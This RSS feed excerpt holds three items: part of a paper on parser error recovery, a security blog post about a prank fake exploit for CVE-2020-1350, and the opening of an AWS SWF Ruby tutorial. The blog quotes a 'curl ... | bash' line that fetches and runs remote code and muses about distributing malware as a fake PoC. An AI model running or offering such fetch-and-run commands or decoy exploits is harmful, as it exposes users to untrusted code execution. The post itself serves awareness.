<a id="x1-1007r2"></a></span><span>sequences</span><span>&nbsp;</span><span>found</span><span>:</span><span>&nbsp;</span><br><span><a id="x1-1008r3"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>1:</span><span>&nbsp;</span><span>Delete</span><span>&nbsp;</span><span>y</span><span>&nbsp;</span><br><span>
<a id="x1-1009r4"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>2:</span><span>&nbsp;</span><span>Insert</span><span>&nbsp;</span><span>,</span><span>&nbsp;</span><br><span><a id="x1-1010r5"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>3:</span><span>&nbsp;</span><span>Insert</span><span>&nbsp;</span><span>=</span>
</p>
  </div>                         </td>
</tr></tbody></table></div>
</div><div><div><table id="TBL-2"><colgroup id="TBL-2-1g"><col id="TBL-2-1"><col id="TBL-2-2"></colgroup><tbody><tr id="TBL-2-1-"><td id="TBL-2-1-1"> <!--l. 195--><!--l. 197--><p><span>(b)</span> </p> </td><td id="TBL-2-1-2"> <div><!--l. 203-->
<p><span><a id="x1-1012r1"></a></span><span>C</span><span>.</span><span>java</span><span>:2:</span><span>&nbsp;</span><span>error</span><span>:</span><span>&nbsp;</span><span>‚Äô;‚Äô</span><span>&nbsp;</span><span>expected</span><span>&nbsp;</span><br><span>
<a id="x1-1013r2"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>int</span><span>&nbsp;</span><span>x</span><span>&nbsp;</span><span>y</span><span>;</span><span>&nbsp;</span><br><span><a id="x1-1014r3"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>^</span><span>&nbsp;</span><br><span>
<a id="x1-1015r4"></a></span><span>C</span><span>.</span><span>java</span><span>:2:</span><span>&nbsp;</span><span>error</span><span>:</span><span>&nbsp;</span><span>&lt;</span><span>identifier</span><span>&gt;</span><span>&nbsp;</span><span>expected</span><span>&nbsp;</span><br><span>
<a id="x1-1016r5"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>int</span><span>&nbsp;</span><span>x</span><span>&nbsp;</span><span>y</span><span>;</span><span>&nbsp;</span><br><span><a id="x1-1017r6"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span><span>^</span>
</p>
  </div>                           </td>
</tr></tbody></table></div></div><p><span>
<span>Figure</span><span>&nbsp;1:  </span></span><span><span>An example of a simple, common Java syntax error (</span><a href="#x1-1001r1"><span>a</span></a><span>) and the problems traditional</span>
<span>error recovery has in dealing with it. </span><span>javac </span><span>(</span><a href="#x1-1011r2"><span>b</span></a><span>) spots the error when it encounters ‚Äò</span><span>y</span><span>‚Äô. Its error</span>
<span>recovery algorithm then repairs the input by inserting a semicolon before ‚Äò</span><span>y</span><span>‚Äô (i.e.</span><span>&nbsp;making the input</span>
<span>equivalent to ‚Äò</span><span>int x; y;</span><span>‚Äô). This then causes a spurious parsing error, since ‚Äò</span><span>y</span><span>‚Äô on its own is not</span>
<span>a valid statement. The </span><span>CPCT</span><span>+</span>  <span>error recovery algorithm we introduce in this paper produces the</span>
<span>output shown in (</span><a href="#x1-1005r3"><span>c</span></a><span>): after spotting an error when parsing encounters ‚Äò</span><span>y</span><span>‚Äô, it uses the Java grammar</span>
<span>to find the complete  set  of  minimum  cost  repair  sequences  (unlike  previous  approaches  which</span>
<span>non-deterministically find one minimum cost repair sequence). In this case three repair sequences</span>
<span>are reported to the user: one can delete ‚Äò</span><span>y</span><span>‚Äô entirely (‚Äò</span><span>int x;</span><span>‚Äô), or insert a comma (‚Äò</span><span>int x, y;</span><span>‚Äô), or</span>
<span>insert an equals sign (</span><span>‚Äòint x = y;‚Äô</span><span>).</span>
</span></p><!--tex4ht:label?: x1-1018r1 -->
                                                                            
                                                                            
</div><hr>
<!--l. 233--><p>It is possible to hand-craft error recovery algorithms for a specific language. These
generally allow better recovery from errors, but are challenging to create. For example,
the Java error recovery approach in the Eclipse IDE is 5KLoC long, making it only
slightly smaller than a modern version of Berkeley Yacc ‚Äî a complete parsing system!
Unsurprisingly, few real-world parsers contain effective hand-written error recovery
algorithms.
</p><!--l. 240--><p>Most of us are so used to these trade-offs (cheap generic algorithms and poor recovery
vs.&nbsp;expensive hand-written algorithms and reasonable recovery) that we assume them to be
inevitable. However, there is a long line of work on more advanced generic error recovery
algorithms. Probably the earliest such algorithm is Aho and Peterson&nbsp;[<a href="#Xaho72minimum">1</a>], which, upon
encountering an error, creates on-the-fly an alternative (possibly ambiguous) grammar which
allows the parser to recover. This algorithm has fallen out of favour in programming
language circles, probably because of its implementation complexity and the difficulty of
explaining to users what recovery has been used. A simpler family of algorithms, which
trace their roots to Fischer <span>et al.</span>&nbsp;[<a href="#Xfischer79locally">11</a>], instead try to find a single minimum cost <span>repair</span>
<span>sequence </span>of token insertions and deletions which allow the parser to recover. Algorithms in
this family are much better at recovering from errors than naive approaches and can
communicate the repairs they find in a way that humans can easily replicate. However, such
algorithms have seen little practical use because their typical performance is seen as
poor and their worst case unbounded [<a href="#Xmckenzie95error">17</a>, p.&nbsp;14]. We add a further complaint: such
approaches only report a single repair sequence to users. In general ‚Äì and especially in
syntactically rich languages ‚Äì there are multiple reasonable repair sequences for a given
error location, and the algorithm has no way of knowing which best matches the user‚Äôs
intentions.
</p><!--l. 261--><p>In this paper we introduce a new error recovery algorithm in the Fischer <span>et al. </span>family, <span>CPCT</span><span>+</span>.
This takes the approach of Corchuelo <span>et al.</span>&nbsp;[<a href="#Xcorchuelo02repairing">5</a>] as a base, corrects it, expands it, and
optimises its implementation. <span>CPCT</span><span>+</span> is simple to implement (under 500 lines of Rust
code), is able to repair nearly all errors in reasonable time, reports the complete set of
minimum cost repair sequences to users, and does so in less time than Corchuelo <span>et</span>
<span>al.</span>.
</p><!--l. 269--><p>We validate <span>CPCT</span><span>+</span> on a corpus of 200,000 real, syntactically incorrect, Java programs
(Section&nbsp;<a href="#x1-140006">6<!--tex4ht:ref: experiment --></a>). <span>CPCT</span><span>+</span> is able to recover 98.37%<span>¬±</span><span>0.017% </span>of files within a 0.5s timeout and does so
while reporting fewer than half the error locations as a traditional panic mode algorithm: in other
words, <span>CPCT</span><span>+</span> substantially reduces the cascading error problem. We also show ‚Äì for, as far as we
know, the first time ‚Äì that advanced error recovery can be naturally added to a Yacc-esque
system, allowing users to make fine-grained decisions about what to do when error recovery has
been applied to an input (Section&nbsp;<a href="#x1-180007">7<!--tex4ht:ref: sec:api --></a>). We believe that this shows that algorithms such as <span>CPCT</span><span>+</span>
are ready for wider usage, either on their own, or as part of a multi-phase recovery
system.
</p>
<h4><span>1.1</span> <a id="x1-20001.1"></a>Defining the problem</h4>
<!--l. 285--><p>Formally speaking, we first test the following hypothesis:
</p><!--l. 287--><dl><dt>
<span>H1</span></dt><dd>The complete set of minimum cost repair sequences can be found in acceptable time.</dd></dl>
                                                                            
                                                                            
<!--l. 292--><p>The only work we are aware of with a similar concept of ‚Äòacceptable time‚Äô is&nbsp;[<a href="#XdeJonge12natural">6</a>], who define it
as the total time spent in error recovery per file, with a threshold of 1s. We use that
definition with one change: Since many compilers are able to fully execute in less than 1s,
we felt that a tighter threshold is more appropriate: we use 0.5s since we think that
even the most demanding users will tolerate such a delay. We strongly validate this
hypothesis.
</p><!--l. 300--><p>The complete set of minimum cost repair sequences makes it more likely that the programmer
will see a repair sequence that matches their original intention (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an example;
Appendix&nbsp;<a href="#x1-28000A">A<!--tex4ht:ref: app:examples --></a> contains further examples in Java, Lua, and PHP). It also opens up a new
opportunity. Previous error recovery algorithms find a single repair sequence, apply that to the
input, and then continue parsing. While that repair sequence may have been a reasonable local
choice, it may cause cascading errors later. Since we have the complete set of minimum
cost repair sequences available, we can select from that set a repair sequence which
causes fewer cascading errors. We thus rank repair sequences by how far they allow
parsing to continue successfully (up to a threshold ‚Äî parsing the whole file would, in
general, be too costly), and choose from the subset that gets furthest (note that the
time required to do this is included in the 0.5s timeout). We thus also test a second
hypothesis:
</p><!--l. 315--><dl><dt>
<span>H2</span></dt><dd>Ranking the complete set of minimum cost repair sequences by how far they allow
parsing to continue locally reduces the global cascading error problem.</dd></dl>
<!--l. 321--><p>We also strongly validate this hypothesis. We do this by comparing ‚Äònormal‚Äô <span>CPCT</span><span>+</span> with a
simple variant <span>CPCT</span><span>+</span><span>rev</span> which reverses the ranking process, always selecting from amongst the
worst ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://soft-dev.org/pubs/html/diekmann_tratt__dont_panic/">https://soft-dev.org/pubs/html/diekmann_tratt__dont_panic/</a></em></p>]]>
            </description>
            <link>https://soft-dev.org/pubs/html/diekmann_tratt__dont_panic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23850718</guid>
            <pubDate>Wed, 15 Jul 2020 19:51:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The day I trolled the entire internet: accidental research project CVE-2020-1350]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 17 (<a href="https://news.ycombinator.com/item?id=23847628">thread link</a>) | @beefhash
<br/>
July 15, 2020 | https://blog.zsec.uk/cve-2020-1350-research/ | <a href="https://web.archive.org/web/*/https://blog.zsec.uk/cve-2020-1350-research/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.zsec.uk/content/images/size/w300/2020/07/unknown.png 300w,
                            https://blog.zsec.uk/content/images/size/w600/2020/07/unknown.png 600w,
                            https://blog.zsec.uk/content/images/size/w1000/2020/07/unknown.png 1000w,
                            https://blog.zsec.uk/content/images/size/w2000/2020/07/unknown.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.zsec.uk/content/images/size/w2000/2020/07/unknown.png" alt="The Day I Trolled The Entire Internet: An Accidental Research Project on CVE-2020-1350">
</figure>
<section>
<div>
<p>What do you get if you create a binary, a few bash scripts, a README and excellent timing? </p><p>An awareness that folks need to understand that ripping code from GitHub and sharing/running without validation can be dangerous. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">today on why people should read code and repos before they run them <a href="https://t.co/calGnBbllS">https://t.co/calGnBbllS</a> exploits üëÄ9/10 would troll the internet again</p>‚Äî Andy Gill (@ZephrFish) <a href="https://twitter.com/ZephrFish/status/1283162770213670915?ref_src=twsrc%5Etfw">July 14, 2020</a></blockquote>

</figure><p>Before we dive into the actual research, here's what actually happened for those who didn't see the fallout, unless you are in the security space and familiar with what happened last 36 hours, it probably won't make much sense quickly.</p><ol><li>Microsoft has a critical flaw in DNS server which resulted in a CVSS 10, CVE-2020-1350 is a real vulnerability that was published:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1350">https://nvd.nist.gov/vuln/detail/CVE-2020-1350</a> It's a brand new vulnerability therefore people would be interested in a proof of concept.</li><li>A security company publishes the info - no public exploit available at the point of publishing this blog, &nbsp;a quick kudos to the team over at Checkpoint Research who found the original vulnerability and published <a href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">a great write up which can be found here.</a></li><li>I created a fake exploit on GitHub minutes after the original blog post was published - playing a prank on hackers and other security companies picking up and publishing in threat intelligence feeds. The code was initially just a bash script then I added a binary loaded with canary tokens to track who was running the script. If anyone is interested Thinkst has a great blog around how canary tokens work <a href="https://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html?m=1">that can be found here.</a></li><li>Lots of people ran the code or helped spread the existence of the fake exploit, folks ran the "proof of concept" code without reading it first and got trolled. If I had been malicious I could have done something much worse than rick-rolling.</li><li>The repository also contains a real fix for the vulnerability. Which can be found here:</li></ol><pre><code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v "TcpReceivePacketSize" /t REG_DWORD /d 0xFF00 /f
net stop DNS &amp;&amp; net start DNS</code></pre><div><p>This is a particularly "amusing" troll because the sort of people who keep up with CVEs and look for proof-of-concept exploits should really know better than to run random code they just got off GitHub without checking what it does. It's obvious with the most cursory examination of the code in the repo that you shouldn't run it, exploit.sh contains:</p><p>curl -L <a href="https://bit.ly/3exifav">https://bit.ly/3exifav</a> | bash</p><p>The code in the repo is loaded with canary tokens and just general trolling, the list of files below details what each thing is and what it does.</p></div><ul><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/CVE-2020-1350.exe">CVE-2020-1350.exe</a> - Benign binary which opens rick roll and pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/Fix.bat">Fix.bat</a> - Batch file that applies the fix from Microsoft</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/LICENCE">LICENCE</a> - The licence file, also does nothing</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/PoC.exe">PoC.exe</a> - &nbsp;Benign binary which opens cmd.exe and additionally pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.md">README.md</a> - Details the README of the repo</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.pdf">README.pdf</a> - Pings a canary token, also a benign document</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/exploit.sh">exploit.sh</a> - Rick roll in shell, also benign</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/windows-exploit.ps1">windows-exploit.ps1</a> - Rick roll in shell, also benign</li></ul><p>So rewind for a second, some of you may be reading thinking WTF is this? Can I have hax? Sorry folks, those who are after hax this is purely an analysis piece of why folks do not seem to understand basics of </p><p>The code in question can be found here:</p><figure><a href="https://github.com/ZephrFish/CVE-2020-1350"><div><p>ZephrFish/CVE-2020-1350</p><p>Bash Proof-of-Concept (PoC) script to exploit SIGRed (CVE-2020-1350). Achieves Domain Admin on Domain Controllers running Windows Server 2000 up to Windows Server 2019. - ZephrFish/CVE-2020-1350</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars1.githubusercontent.com/u/5783068?s=400&amp;v=4"></p></a></figure><p>It's an interesting project to map a few things:</p><ul><li>How many people blindly trust what they read on the internet, what year is it folks 2020? Rick Rolling still alive...</li><li>It is a great way to catch insider threats! </li><li>The amount of TI feeds that just crawl things without validation and submit links</li><li>How beautiful the Internet is when people pick something up and run with it?</li></ul><h2 id="0x0-how-many-people-blindly-trust-what-they-read-on-the-internet">0x0 How many people blindly trust what they read on the internet?</h2><p>This started out as a troll but quickly turned into a research project which has gathered &nbsp;significant traction in a very short space of time. Goes to show people will run things without checking what they actually do. </p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-13.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-13.png 600w, https://blog.zsec.uk/content/images/size/w1000/2020/07/image-13.png 1000w, https://blog.zsec.uk/content/images/2020/07/image-13.png 1325w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-14.png" alt=""></figure><h2 id="0x1-it-is-a-great-way-to-catch-insider-threats-">0x1 It is a great way to catch insider threats! </h2><p>In total at the time of publishing the <a href="https://docs.canarytokens.org/">canary tokens</a> alone have caught five separate instances of potential insider threats and I've had messages to thank me :-). </p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-16.png" alt=""><figcaption>Insider Threats Be Like</figcaption></figure><h2 id="0x2-the-amount-of-threat-intel-feeds-that-blindly-crawl-">0x2 The Amount of Threat Intel Feeds that Blindly Crawl...</h2><p>The PoC was picked up by TI feeds and was live on several TI feeds pretty quickly:</p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-10.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-10.png 600w, https://blog.zsec.uk/content/images/size/w1000/2020/07/image-10.png 1000w, https://blog.zsec.uk/content/images/2020/07/image-10.png 1018w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-11.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-11.png 600w, https://blog.zsec.uk/content/images/2020/07/image-11.png 925w" sizes="(min-width: 720px) 720px"></figure><p>Both have since taken down the posts but it was lovely to see, Vulcan came out and admitted they'd been hasty:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">We should have been but weren't. We were hasty. The post has been updated accordingly.</p>‚Äî Vulcan Cyber (@VulcanCyber) <a href="https://twitter.com/VulcanCyber/status/1283447175645519872?ref_src=twsrc%5Etfw">July 15, 2020</a></blockquote>

</figure><p>Quick hat tip to<a href="https://twitter.com/TinkerSec"> TinkerSec</a> too for his PoC:</p><figure><a href="https://github.com/tinkersec/cve-2020-1350"><div><p>tinkersec/cve-2020-1350</p><p>Bash Proof-of-Concept (PoC) script to exploit SIGRed (CVE-2020-1350). Achieves Domain Admin on Domain Controllers running Windows Server 2003 up to Windows Server 2019. - tinkersec/cve-2020-1350</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>tinkersec</span><span>GitHub</span></p></div><p><img src="https://avatars3.githubusercontent.com/u/35904426?s=400&amp;v=4"></p></a></figure><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-17.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-17.png 600w, https://blog.zsec.uk/content/images/2020/07/image-17.png 747w" sizes="(min-width: 720px) 720px"></figure><p>The official french CERT picked it up and ran with it! </p><figure><blockquote data-width="550"><p lang="fr" dir="ltr">Voici le lien public sur le PoC : <a href="https://t.co/rgqrod9LCf">https://t.co/rgqrod9LCf</a></p>‚Äî Cert-IST (@cert_ist) <a href="https://twitter.com/cert_ist/status/1283312693689147392?ref_src=twsrc%5Etfw">July 15, 2020</a></blockquote>

</figure><h2 id="timeline-of-events">Timeline of Events</h2><p>2020-07-14 20:00 GMT+1: Original blog post created by checkpoint<br>2020-07-14 20:04 GMT+1: PoC Repository first created<br>2020-07-14 20:09 GMT+1: PoC Tweeted from <a href="https://twitter.com/CVE20201350/status/1283116416191934467">https://twitter.com/CVE20201350/status/1283116416191934467</a><br>2020-07-14 20:33 GMT+1: First retweet of the vuln<br>2020-07-14 20:48 GMT+1: PoC link hits vulnmon TI feed<br>2020-07-14 21:06 GMT+1: First canary token hit from IP located in Brussels<br>2020-07-14 21:29 GMT+1: Tweet started gaining traction<br>2020-07-14 23:45 GMT+1: TinkerSec's PoC published<br>2020-07-15 09:09 GMT+1: Cert-IST posted False PoC<br>2020-07-15 16:10 GMT+1: This blog post posted :-)<br>2020-07-16 01:50 GMT+1: Stats updated</p><h2 id="0x3-how-beautiful-the-internet-is-when-people-pick-something-up-and-run-with-it">0x3 How beautiful the Internet is when people pick something up and run with it?</h2><p>At the time of publishing the canary tokens have triggered over 1000 times, the repository has received in excess of ~70k views, the original tweet is also close to 420k impressions. I'll update this post with more analysis after a few days of gathering locations of canary fires! </p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-23.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-23.png 600w, https://blog.zsec.uk/content/images/2020/07/image-23.png 988w" sizes="(min-width: 720px) 720px"></figure><p>This blog has received close to ~260k hits in the last 24hr(2020-07-16 16:20 GMT+1). </p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-22.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-22.png 600w, https://blog.zsec.uk/content/images/size/w1000/2020/07/image-22.png 1000w, https://blog.zsec.uk/content/images/2020/07/image-22.png 1040w" sizes="(min-width: 720px) 720px"></figure><p>SANS also mentioned both PoCs in their webcast, saw the code and reviewed it as fake as can be seen below:</p><figure><img src="https://blog.zsec.uk/content/images/2020/07/image-15.png" alt="" srcset="https://blog.zsec.uk/content/images/size/w600/2020/07/image-15.png 600w, https://blog.zsec.uk/content/images/size/w1000/2020/07/image-15.png 1000w, https://blog.zsec.uk/content/images/2020/07/image-15.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>The tweet thread below shows some of the lessons learned! </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">The one thing that I've learned from all of this is that people will run anything, if I was a genuine malicious actor it's arguably one of the best ways to blindly phish people, replace that EXE with malware and you'd have 100s of shells. Pretty mental really <a href="https://t.co/fBvQNVXi2G">pic.twitter.com/fBvQNVXi2G</a></p>‚Äî Andy Gill (@ZephrFish) <a href="https://twitter.com/ZephrFish/status/1283318201506566144?ref_src=twsrc%5Etfw">July 15, 2020</a></blockquote>

</figure><figure><blockquote data-width="550"><p lang="en" dir="ltr">If we've learned anything in the last 48hrs, we need to do more due diligence on what is downloaded and ran from the internet. Likewise a lot of feeds who have picked it up without checking is a bit mad. There has been a lot of salt from a few too, which is inevitable with this.</p>‚Äî Andy Gill (@ZephrFish) <a href="https://twitter.com/ZephrFish/status/1283718637875068929?ref_src=twsrc%5Etfw">July 16, 2020</a></blockquote>

</figure>
</div>
</section>
<section>
<h3>Subscribe to ZeroSec - Adventures In Information Security</h3>
<p>Get the latest posts delivered right to your inbox</p>
<form data-members-form="subscribe">

<p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
</p>
<p>
Please enter a valid email address!
</p>
</form>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.zsec.uk/cve-2020-1350-research/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23847628</guid>
            <pubDate>Wed, 15 Jul 2020 16:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Simple Workflow Service (SWF)]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 43 (<a href="https://news.ycombinator.com/item?id=23844177">thread link</a>) | @adrianancona
<br/>
July 15, 2020 | https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In this post I‚Äôm going to explore Simple Workflow Service (SWF) available in AWS.</p>

<p>To understand what SWF is good for, we need to first understand what a workflow is. <a href="https://en.wikipedia.org/wiki/Workflow">Wikipedia defines it</a> as follows:</p>

<blockquote>
  <p>A workflow consists of an orchestrated and repeatable pattern of activity, enabled by the systematic organization of resources into processes that transform materials, provide services, or process information. It can be depicted as a sequence of operations, the work of a person or group, the work of an organization of staff, or one or more simple or complex mechanisms.</p>
</blockquote>

<p>In computer systems we care about the part about processing information. Some things that could be modeled as workflows:</p>

<ul>
  <li><strong>Deployment pipeline</strong>: We could receive some code as input and then build it in a worker machine. We can run tests in parallel in different machines. If all tests pass we can deploy the binaries to another set of machines.</li>
  <li><strong>Coordinate shipments</strong>: A user buys a product on an online store and the order is placed on a system. A human monitors this system and takes care of finding the products in a warehouse and shipping them to the correct address. When the shipment is made, the information is entered in a system. The workflow notices this information an e-mails the user the shipping details.</li>
  <li><strong>Asynchronous image processing</strong>: A system uploads files to a system for processing (let‚Äôs say, create thumbnails). A workflow uses multiple workers to execute the task. If any of the machines fails while processing a set of files, they same work can be taken over by another worker.</li>
</ul>

<!--more-->

<p>Those are some high level examples. In this post I‚Äôm going to go over one example in more detail.</p>

<h2 id="components">Components</h2>

<p>Before we start building a workflow, let‚Äôs learn a little about the components of an SWF:</p>

<ul>
  <li><strong>Workflow</strong>: A set of activities, and some logic that defines how these work together to achieve some objective</li>
  <li><strong>Domain</strong>: A workflow lives in a domain. A Domain can contain multiple workflows. Workflows in different domains can‚Äôt interact</li>
  <li><strong>Execution</strong>: An instance of the workflow with its associated state</li>
  <li><strong>Event</strong>: Represents a change on the state of an execution</li>
  <li><strong>Starter</strong>: A program, or person that starts and execution</li>
  <li><strong>Activity</strong>: A type of task that needs to be performed, such as: resizing images, running tests, etc</li>
  <li><strong>Task</strong>: An invocation of an activity</li>
  <li><strong>Worker</strong>: Program that performs tasks</li>
  <li><strong>Decider</strong>: Program that defines the logic for the workflow</li>
</ul>

<h2 id="machine-repair-workflow">Machine repair workflow</h2>

<p>To help us get familiar with SWF, we are going to create a workflow to model the process for fixing a broken machine in a fleet. It will look something like this:</p>

<p><a href="https://ncona.com/images/posts/fixing-broken-machine-workflow.png"><img src="https://ncona.com/images/posts/fixing-broken-machine-workflow.png" alt="Fixing broken machine workflow"></a></p>

<p>This workflow can be used in a datacenter that runs a lot of machines. We can have the workflow probe machines to see if they are working well. If it notices something wrong, it sets the machine state as <code>maintenance</code> in a database. If it doesn‚Äôt find anything wrong, it finishes the execution.</p>

<p>Once a machine is drained we‚Äôll do two things. We‚Äôll have a person take a look at the machine and fix it and we‚Äôll take the oportunity to reimage the machine so we have clean machine when it comes back.</p>

<p>Once the repair and the reimage are done, we can set the state back to <code>available</code> and finish the execution.</p>

<h2 id="getting-ready">Getting ready</h2>

<p>For our activities and the decider, we are going to need the AWS SDK. In this section I‚Äôm going to show how to get it ready.</p>

<p>We‚Äôll use Ruby for our examples, since it‚Äôs easy to run and it‚Äôs very well supported. The latest version of the Ruby SDK at the time of this writing is version 3. We‚Äôll create a <code>Gemfile</code> with dependencies:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>source</span> <span>'https://rubygems.org'</span>

<span>gem</span> <span>'aws-sdk-swf'</span><span>,</span> <span>'~&gt; 1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can then install them using:</p>



<p>The AWS SDK will need to communicate with AWS, so we‚Äôll need some credentials, these credentials can be set in environment variables like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>export </span><span>AWS_ACCESS_KEY_ID</span><span>=</span>&lt;your key <span>id</span><span>&gt;</span>
<span>export </span><span>AWS_SECRET_ACCESS_KEY</span><span>=</span>&lt;your secret&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="activities">Activities</h2>

<p>Each of the boxes in the diagram above is an <code>activity</code>. Activities can be pretty self contained, so we‚Äôll start building those.</p>

<p>An activity works by polling the workflow for pending tasks. If it finds that there is a task it can perform, it does so, and returns a result back. Polling then continues until there is more work to do.</p>

<p>Our activities will share some code with the decider, so let‚Äôs create a base class that will be shared between them (<code>workflow_base.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td><pre><span>require</span> <span>'aws-sdk-swf'</span>

<span>class</span> <span>WorkflowBase</span>
  <span>DOMAIN_NAME</span> <span>=</span> <span>'datacenter-domain'</span>
  <span>REGION</span> <span>=</span> <span>'ap-southeast-2'</span>
  <span>TASK_LIST_NAME</span> <span>=</span> <span>'repairs-workflow-task-list'</span>
  <span>VERSION</span> <span>=</span> <span>'14'</span>

  <span>def</span> <span>initialize</span>
    <span>@swf</span> <span>=</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Client</span><span>.</span><span>new</span><span>(</span><span>region: </span><span>REGION</span><span>)</span>
    <span>register_domain</span><span>(</span><span>REGION</span><span>,</span> <span>DOMAIN_NAME</span><span>)</span>
  <span>end</span>

  <span># Register a domain for our workflow (if it doesn't already exist)</span>
  <span>def</span> <span>register_domain</span><span>(</span><span>region</span><span>,</span> <span>domain_name</span><span>)</span>
    <span>swf</span> <span>=</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Client</span><span>.</span><span>new</span><span>(</span><span>region: </span><span>region</span><span>)</span>
    <span>begin</span>
      <span>swf</span><span>.</span><span>register_domain</span><span>({</span>
        <span>name: </span><span>domain_name</span><span>,</span>
        <span>workflow_execution_retention_period_in_days: </span><span>'3'</span>
      <span>})</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> registered"</span>
    <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>DomainAlreadyExistsFault</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> already exists"</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This class defines some constants that are shared between the decider and activities. It also initializes the SWF client and register the domain if it doesn‚Äôt yet exist.</p>

<p>Because of the way SWF works, it is best if the code for all our activities is handled by a single program. This program will poll for any new tasks in the domain. Every time it sees a task it will execute it and send the result back to SWF. Because each task is blocking, we could spin many copies of this program to allow tasks to be executed in parallel if we wanted to.</p>

<p>The activities handler (<code>activities.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
</pre></td><td><pre><span>require</span> <span>'aws-sdk-swf'</span>
<span>require_relative</span> <span>'workflow_base.rb'</span>

<span>class</span> <span>Activities</span> <span>&lt;</span> <span>WorkflowBase</span>
  <span>ACTIVITIES</span> <span>=</span> <span>[</span>
    <span>'probe_machines'</span><span>,</span>
